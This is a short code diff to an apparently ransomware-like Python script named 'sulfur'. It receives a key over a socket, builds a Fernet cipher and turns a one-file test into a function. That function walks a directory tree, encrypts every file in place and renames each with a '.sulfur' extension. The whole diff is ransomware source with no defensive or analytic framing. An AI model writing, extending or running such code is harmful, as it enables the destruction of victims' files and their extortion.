@@ -18,20 +18,27 @@ dat=client_socket.recv(64).decode()
 hash=bytes.fromhex(dat)
 fernet = Fernet(base64.urlsafe_b64encode(hash))
 
-test="sulfur/test.txt"
-name=test.split(".")[0]
+def encript(file):
+    # Read and encrypt the file
+    with open(file, "rb") as orfile:
+        original = orfile.read()
 
-# Read and encrypt the file
-with open(test, "rb") as file:
-    original = file.read()
+    encrypted = fernet.encrypt(original)
 
-encrypted = fernet.encrypt(original)
+    
 
-newname=name+".sulfur"
-os.rename(test,newname)
+    newname= file + ".sulfur"
+    os.rename(file,newname)
 
-# Write the encrypted data
-with open(newname, "wb") as encrypted_file:
-    encrypted_file.write(encrypted)
+    # Write the encrypted data
+    with open(newname, "wb") as encrypted_file:
+        encrypted_file.write(encrypted)
 
-print(os.getlogin())
+
+
+dir="test"
+
+for root, dirs, files in os.walk(dir):
+    for file in files:
+        full_path = os.path.join(root, file)
+        encript(full_path)
